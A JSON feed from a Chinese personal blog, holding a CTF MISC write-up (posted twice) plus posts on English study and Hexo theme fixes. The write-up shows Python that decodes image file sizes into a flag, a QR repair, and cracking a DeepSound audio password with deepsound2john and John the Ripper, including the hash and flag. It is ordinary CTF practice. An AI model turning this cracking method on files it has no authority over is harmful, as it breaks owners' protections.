{
    "version": "https://jsonfeed.org/version/1",
    "title": "Canary's Blog",
    "subtitle": "我用回忆温暖了想你的每一刻",
    "icon": "https://zephyr-cyber.github.io.git/images/favicon.ico",
    "description": "刻意练习",
    "home_page_url": "https://zephyr-cyber.github.io.git",
    "items": [
        {
            "id": "https://zephyr-cyber.github.io.git/computer-science/Misc/course-misc/%E6%AF%94%E8%B5%9Bmisc/",
            "url": "https://zephyr-cyber.github.io.git/computer-science/Misc/course-misc/%E6%AF%94%E8%B5%9Bmisc/",
            "title": "比赛MISC",
            "date_published": "2021-12-06T06:37:34.711Z",
            "content_html": "<p>2021/10/21 更新了 MISC3 - 眼神要好使，得到的 flag 中的内容请 md5 后上交 - blasting 的附件</p>\n<h1 id=\"祥云杯2021-misc-鸣雏恋\"><a class=\"anchor\" href=\"#祥云杯2021-misc-鸣雏恋\">#</a> 祥云杯 2021-MISC - 鸣雏恋</h1>\n<p>算是学习脚本了吧<br />\n遍历目录脚本</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>files <span class=\"token operator\">=</span> os<span class=\"token punctuation\">.</span>listdir<span class=\"token punctuation\">(</span>filePath<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">#遍历文件夹里的图片</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">for</span> <span class=\"token builtin\">file</span> <span class=\"token keyword\">in</span> files<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token comment\"># 把文件路径和文件名结合起来</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        file_d <span class=\"token operator\">=</span> os<span class=\"token punctuation\">.</span>path<span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span>filePath<span class=\"token punctuation\">,</span> <span class=\"token builtin\">file</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token comment\"># 判断该文件是单个文件还是文件夹</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token keyword\">if</span> os<span class=\"token punctuation\">.</span>path<span class=\"token punctuation\">.</span>isdir<span class=\"token punctuation\">(</span>file_d<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>  <span class=\"token comment\"># 如果是文件夹则递归调用 scanDir () 函数</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>            scanDir<span class=\"token punctuation\">(</span>file_d<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>            file_stats <span class=\"token operator\">=</span> os<span class=\"token punctuation\">.</span>stat<span class=\"token punctuation\">(</span>file_d<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>file_stats<span class=\"token punctuation\">.</span>st_size<span class=\"token operator\">==</span><span class=\"token number\">262</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>                f<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token string\">'0'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>                f<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token string\">'1'</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>遍历不一定是按顺序的，还是以用图片的数字编号为准</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> os</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> base64</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    f <span class=\"token operator\">=</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'key.txt'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'w'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">129488</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        file_d <span class=\"token operator\">=</span> <span class=\"token string\">r'C:\\\\Users\\\\pengzixuan\\\\Desktop\\\\out\\\\'</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">'.png'</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        file_stats <span class=\"token operator\">=</span> os<span class=\"token punctuation\">.</span>stat<span class=\"token punctuation\">(</span>file_d<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>file_stats<span class=\"token punctuation\">.</span>st_size <span class=\"token operator\">==</span> <span class=\"token number\">262</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>            f<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token string\">'0'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>            f<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token string\">'1'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    f<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    f <span class=\"token operator\">=</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'key.txt'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'r'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    flag<span class=\"token operator\">=</span>f<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    data<span class=\"token operator\">=</span><span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        str1 <span class=\"token operator\">=</span> flag<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">:</span>i <span class=\"token operator\">+</span> <span class=\"token number\">8</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        data<span class=\"token operator\">+=</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>str1<span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    data1<span class=\"token operator\">=</span>data<span class=\"token punctuation\">[</span><span class=\"token number\">22</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span>  <span class=\"token comment\">#去掉前几位</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>data1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    bs <span class=\"token operator\">=</span> base64<span class=\"token punctuation\">.</span>b64decode<span class=\"token punctuation\">(</span>data1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'1.png'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'wb'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        f<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span>bs<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"高新区初赛misc\"><a class=\"anchor\" href=\"#高新区初赛misc\">#</a> 高新区初赛 MISC</h1>\n<p>HalfQR<br />\n 使用工具<span class=\"exturl\" data-url=\"aHR0cHM6Ly9oMzExMHcwcjFkLmNvbS9xcmF6eWJveC8=\">点击这里</span><br />\n Qrazybox<br />\n 在纠错位 L，mask 为 2 调试出 flag<br />\n<img data-src=\"/img/MISC/gaoxinqu.jpg\" alt=\"avatar\" /><br />\n<img data-src=\"/img/MISC/gaoxinqu2.jpg\" alt=\"avatar\" /></p>\n<h1 id=\"misc3-眼神要好使得到的flag中的内容请md5后上交-blasting的附件\"><a class=\"anchor\" href=\"#misc3-眼神要好使得到的flag中的内容请md5后上交-blasting的附件\">#</a> MISC3 - 眼神要好使，得到的 flag 中的内容请 md5 后上交 - blasting 的附件</h1>\n<p>Blasting 是爆破的意思考虑到要爆破<br />\n<img data-src=\"/img/MISC/blasting1.jpg\" alt=\"avatar\" /></p>\n<p>得到 3 个文件<br />\n先看音频<br />\n<img data-src=\"/img/MISC/blasting2.jpg\" alt=\"avatar\" /></p>\n<p>48000hz 会出来一部分 flag<br />\n 继续看两个图片<br />\n<img data-src=\"/img/MISC/blasting3.jpg\" alt=\"avatar\" /></p>\n<p>第二张图片出现错误怀疑爆破宽度<br />\n先改一下宽度<br />\n<img data-src=\"/img/MISC/blasting4.jpg\" alt=\"avatar\" /></p>\n<p>直接复原了<br />\n两张一摸一样的图<br />\n<img data-src=\"/img/MISC/blasting5.jpg\" alt=\"avatar\" /></p>\n<p>猜测盲水印<br />\n用盲水印脚本<br />\n<img data-src=\"/img/MISC/blasting6.jpg\" alt=\"avatar\" /></p>\n<p>得到提示<br />\n Deepsound，网上搜一下，是个音频隐藏工具下载<br />\n<img data-src=\"/img/MISC/blasting7.jpg\" alt=\"avatar\" /></p>\n<p>然后把音频放入要密码…… 太烦了<br />\n这里考虑到了爆破，上 kali<br />\n 用<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL29wZW53YWxsL2pvaG4vYmxvYi9ibGVlZGluZy1qdW1iby9ydW4vZGVlcHNvdW5kMmpvaG4ucHk=\"> https://github.com/openwall/john/blob/bleeding-jumbo/run/deepsound2john.py</span><br />\ndeepsound2john.py 脚本<br />\n<img data-src=\"/img/MISC/blasting8.jpg\" alt=\"avatar\" /></p>\n<p>得到<br />\n john.wav:$dynamic_1529$7242ef6f559962f7e928afc8be404f611557e267<br />\n 然后直接 john 一下<br />\n<img data-src=\"/img/MISC/blasting9.jpg\" alt=\"avatar\" /></p>\n<p>得到下面的数据！@#$%^&amp;*<br />\n 看起来像密码试一下<br />\n成功<br />\n<img data-src=\"/img/MISC/blasting10.jpg\" alt=\"avatar\" /></p>\n<p>得到 flag.txt<br />\n 打开文件<br />\n<img data-src=\"/img/MISC/blasting11.jpg\" alt=\"avatar\" /></p>\n<p 725456a7196c09b559ccd441738b0cae=\"\">最后 flag {iheatradio}<br />\n Iheatradio 中间 md5 加密一下<br />\n flag</p>\n",
            "tags": [
                "计算机科学",
                "CTF",
                "CTF",
                "Misc"
            ]
        },
        {
            "id": "https://zephyr-cyber.github.io.git/computer-science/note/theme-shoka-doc/%E6%AF%94%E8%B5%9Bmisc/",
            "url": "https://zephyr-cyber.github.io.git/computer-science/note/theme-shoka-doc/%E6%AF%94%E8%B5%9Bmisc/",
            "title": "比赛MISC",
            "date_published": "2021-12-06T06:23:48.390Z",
            "content_html": "<p>2021/10/21 更新了 MISC3 - 眼神要好使，得到的 flag 中的内容请 md5 后上交 - blasting 的附件</p>\n<h1 id=\"祥云杯2021-misc-鸣雏恋\"><a class=\"anchor\" href=\"#祥云杯2021-misc-鸣雏恋\">#</a> 祥云杯 2021-MISC - 鸣雏恋</h1>\n<p>算是学习脚本了吧<br />\n遍历目录脚本</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>files <span class=\"token operator\">=</span> os<span class=\"token punctuation\">.</span>listdir<span class=\"token punctuation\">(</span>filePath<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">#遍历文件夹里的图片</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">for</span> <span class=\"token builtin\">file</span> <span class=\"token keyword\">in</span> files<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token comment\"># 把文件路径和文件名结合起来</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        file_d <span class=\"token operator\">=</span> os<span class=\"token punctuation\">.</span>path<span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span>filePath<span class=\"token punctuation\">,</span> <span class=\"token builtin\">file</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token comment\"># 判断该文件是单个文件还是文件夹</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token keyword\">if</span> os<span class=\"token punctuation\">.</span>path<span class=\"token punctuation\">.</span>isdir<span class=\"token punctuation\">(</span>file_d<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>  <span class=\"token comment\"># 如果是文件夹则递归调用 scanDir () 函数</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>            scanDir<span class=\"token punctuation\">(</span>file_d<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>            file_stats <span class=\"token operator\">=</span> os<span class=\"token punctuation\">.</span>stat<span class=\"token punctuation\">(</span>file_d<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>file_stats<span class=\"token punctuation\">.</span>st_size<span class=\"token operator\">==</span><span class=\"token number\">262</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>                f<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token string\">'0'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>                f<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token string\">'1'</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>遍历不一定是按顺序的，还是以用图片的数字编号为准</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> os</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> base64</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    f <span class=\"token operator\">=</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'key.txt'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'w'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">129488</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        file_d <span class=\"token operator\">=</span> <span class=\"token string\">r'C:\\\\Users\\\\pengzixuan\\\\Desktop\\\\out\\\\'</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">'.png'</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        file_stats <span class=\"token operator\">=</span> os<span class=\"token punctuation\">.</span>stat<span class=\"token punctuation\">(</span>file_d<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>file_stats<span class=\"token punctuation\">.</span>st_size <span class=\"token operator\">==</span> <span class=\"token number\">262</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>            f<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token string\">'0'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>            f<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token string\">'1'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    f<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    f <span class=\"token operator\">=</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'key.txt'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'r'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    flag<span class=\"token operator\">=</span>f<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    data<span class=\"token operator\">=</span><span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        str1 <span class=\"token operator\">=</span> flag<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">:</span>i <span class=\"token operator\">+</span> <span class=\"token number\">8</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        data<span class=\"token operator\">+=</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>str1<span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    data1<span class=\"token operator\">=</span>data<span class=\"token punctuation\">[</span><span class=\"token number\">22</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span>  <span class=\"token comment\">#去掉前几位</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>data1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    bs <span class=\"token operator\">=</span> base64<span class=\"token punctuation\">.</span>b64decode<span class=\"token punctuation\">(</span>data1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'1.png'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'wb'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        f<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span>bs<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"高新区初赛misc\"><a class=\"anchor\" href=\"#高新区初赛misc\">#</a> 高新区初赛 MISC</h1>\n<p>HalfQR<br />\n 使用工具<span class=\"exturl\" data-url=\"aHR0cHM6Ly9oMzExMHcwcjFkLmNvbS9xcmF6eWJveC8=\">点击这里</span><br />\n Qrazybox<br />\n 在纠错位 L，mask 为 2 调试出 flag<br />\n<img data-src=\"/img/MISC/gaoxinqu.jpg\" alt=\"avatar\" /><br />\n<img data-src=\"/img/MISC/gaoxinqu2.jpg\" alt=\"avatar\" /></p>\n<h1 id=\"misc3-眼神要好使得到的flag中的内容请md5后上交-blasting的附件\"><a class=\"anchor\" href=\"#misc3-眼神要好使得到的flag中的内容请md5后上交-blasting的附件\">#</a> MISC3 - 眼神要好使，得到的 flag 中的内容请 md5 后上交 - blasting 的附件</h1>\n<p>Blasting 是爆破的意思考虑到要爆破<br />\n<img data-src=\"/img/MISC/blasting1.jpg\" alt=\"avatar\" /></p>\n<p>得到 3 个文件<br />\n先看音频<br />\n<img data-src=\"/img/MISC/blasting2.jpg\" alt=\"avatar\" /></p>\n<p>48000hz 会出来一部分 flag<br />\n 继续看两个图片<br />\n<img data-src=\"/img/MISC/blasting3.jpg\" alt=\"avatar\" /></p>\n<p>第二张图片出现错误怀疑爆破宽度<br />\n先改一下宽度<br />\n<img data-src=\"/img/MISC/blasting4.jpg\" alt=\"avatar\" /></p>\n<p>直接复原了<br />\n两张一摸一样的图<br />\n<img data-src=\"/img/MISC/blasting5.jpg\" alt=\"avatar\" /></p>\n<p>猜测盲水印<br />\n用盲水印脚本<br />\n<img data-src=\"/img/MISC/blasting6.jpg\" alt=\"avatar\" /></p>\n<p>得到提示<br />\n Deepsound，网上搜一下，是个音频隐藏工具下载<br />\n<img data-src=\"/img/MISC/blasting7.jpg\" alt=\"avatar\" /></p>\n<p>然后把音频放入要密码…… 太烦了<br />\n这里考虑到了爆破，上 kali<br />\n 用<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL29wZW53YWxsL2pvaG4vYmxvYi9ibGVlZGluZy1qdW1iby9ydW4vZGVlcHNvdW5kMmpvaG4ucHk=\"> https://github.com/openwall/john/blob/bleeding-jumbo/run/deepsound2john.py</span><br />\ndeepsound2john.py 脚本<br />\n<img data-src=\"/img/MISC/blasting8.jpg\" alt=\"avatar\" /></p>\n<p>得到<br />\n john.wav:$dynamic_1529$7242ef6f559962f7e928afc8be404f611557e267<br />\n 然后直接 john 一下<br />\n<img data-src=\"/img/MISC/blasting9.jpg\" alt=\"avatar\" /></p>\n<p>得到下面的数据！@#$%^&amp;*<br />\n 看起来像密码试一下<br />\n成功<br />\n<img data-src=\"/img/MISC/blasting10.jpg\" alt=\"avatar\" /></p>\n<p>得到 flag.txt<br />\n 打开文件<br />\n<img data-src=\"/img/MISC/blasting11.jpg\" alt=\"avatar\" /></p>\n<p 725456a7196c09b559ccd441738b0cae=\"\">最后 flag {iheatradio}<br />\n Iheatradio 中间 md5 加密一下<br />\n flag</p>\n",
            "tags": [
                "计算机科学",
                "CTF",
                "CTF",
                "Misc"
            ]
        },
        {
            "id": "https://zephyr-cyber.github.io.git/English/",
            "url": "https://zephyr-cyber.github.io.git/English/",
            "title": "insist learn english",
            "date_published": "2021-12-03T12:13:44.623Z",
            "content_html": "<p>Study English ，Test IELTS!!!!!</p>\n<h1 id=\"study-english-test-ielts\"><a class=\"anchor\" href=\"#study-english-test-ielts\">#</a> Study English ，Test IELTS!!!!!</h1>\n<h2 id=\"now-i-will-use-a-language-which-is-english-to-write\"><a class=\"anchor\" href=\"#now-i-will-use-a-language-which-is-english-to-write\">#</a> Now , I will use a language which is English to write .</h2>\n<p>Accmulating some words</p>\n<ol>\n<li>! !glimpse! ! {.bulr} :  123123</li>\n</ol>\n<p>!! 黑幕黑幕黑幕黑幕黑幕黑幕！！： 鼠标滑过显示内容</p>\n",
            "tags": [
                "English",
                "English"
            ]
        },
        {
            "id": "https://zephyr-cyber.github.io.git/hexo/",
            "url": "https://zephyr-cyber.github.io.git/hexo/",
            "title": "hexo搭建的一些问题",
            "date_published": "2021-12-03T11:53:01.713Z",
            "content_html": "<h3 id=\"最近在学blog知识遇到无数问题小白的我又不会开发htmlcss在这里遇到的一些问题以及开发者没有提及到的\"><a class=\"anchor\" href=\"#最近在学blog知识遇到无数问题小白的我又不会开发htmlcss在这里遇到的一些问题以及开发者没有提及到的\">#</a> 最近在学 blog 知识，遇到无数问题，小白的我又不会开发 HTML+CSS, 在这里遇到的一些问题，以及开发者没有提及到的。</h3>\n<h1 id=\"关于本地头像hexo-clean容易被清除的问题\"><a class=\"anchor\" href=\"#关于本地头像hexo-clean容易被清除的问题\">#</a> 关于本地头像 hexo clean 容易被清除的问题</h1>\n<p>github 上的拷贝的默认是本地的存储路径，每次更新 hexo clean，public 里面的文件都会被清除，导致每次更新 blog 很繁琐，毕竟有很多图片。</p>\n<h3 id=\"我们可以用cdn加速图片的方式部署\"><a class=\"anchor\" href=\"#我们可以用cdn加速图片的方式部署\">#</a> 我们可以用 cdn 加速图片的方式部署</h3>\n<p>你的主题目录下的_config.yml</p>\n<figure class=\"highlight yml\"><figcaption data-lang=\"YAML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#Assets</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token key atrule\">statics</span><span class=\"token punctuation\">:</span> /</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token key atrule\">css</span><span class=\"token punctuation\">:</span> css</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token key atrule\">js</span><span class=\"token punctuation\">:</span> js</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token key atrule\">images</span><span class=\"token punctuation\">:</span> images</pre></td></tr></table></figure><p>默认 images 会把下面的 avatar 后面的路径套上 /images/。所以除了输入本地文件，其他的没用 。</p>\n<p>修改文件 <code>themes/shoka/layout/_partials/post/post.njk</code>  下面的大概第五行的位置</p>\n<p><code>&lt;meta itemprop=&quot;image&quot; content=&quot;&#123;&#123; url_for(theme.statics + theme.images + '/' + theme.sidebar.avatar) &#125;&#125;&quot;&gt;</code></p>\n<p>改为</p>\n<p><code>&lt;meta itemprop=&quot;image&quot; content=&quot;&#123;&#123; url_for(theme.sidebar.avatar) &#125;&#125;&quot;&gt;</code></p>\n<p>修改文件 <code>themes/shoka/layout/_partials/sidebar/overview.njk</code>  大概第三行的位置</p>\n<p><code>data-src=&quot;&#123;&#123; url_for(theme.statics + theme.images + '/' + theme.sidebar.avatar) &#125;&#125;&quot;&gt;</code></p>\n<p>改为</p>\n<p><code>data-src=&quot;&#123;&#123; url_for(theme.sidebar.avatar) &#125;&#125;&quot;&gt;</code></p>\n<p>去掉路径就可以了，然后</p>\n<p><img data-src=\"https://cdn.jsdelivr.net/gh/zephyr-cyber/Blog-Gallery@main//blog-img/avatar.jpg\" alt=\"\" /></p>\n<p>加上自己的 cdn 就行，图片就会出来。</p>\n<p>感谢<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubGF2ZW5kZXJkaC5jbi8=\"> Lavender</span> 大佬提供帮助！</p>\n<h1 id=\"关于看板娘live2d-widget的shoka主题的问题\"><a class=\"anchor\" href=\"#关于看板娘live2d-widget的shoka主题的问题\">#</a> 关于看板娘 live2d-widget 的 shoka 主题的问题</h1>\n<p>hexo-helper-live2d 模板的方法不在赘述，csdn 上有很多<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpc2h1d2VuNzk4Ni9hcnRpY2xlL2RldGFpbHMvMTA4ODYyNDIz\"> hexo-helper-live2d</span></p>\n<p>看板娘 live2d-widget 的源码<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3N0ZXZlbmpvZXpoYW5nL2xpdmUyZC13aWRnZXQ=\">点击这里</span></p>\n<p>emmmm 介绍的很简单。</p>\n<h2 id=\"利用cdn网络资源\"><a class=\"anchor\" href=\"#利用cdn网络资源\">#</a> 利用 cdn 网络资源</h2>\n<p>把 live2d-widget 放在主题 source 下面</p>\n<p>autoload.js 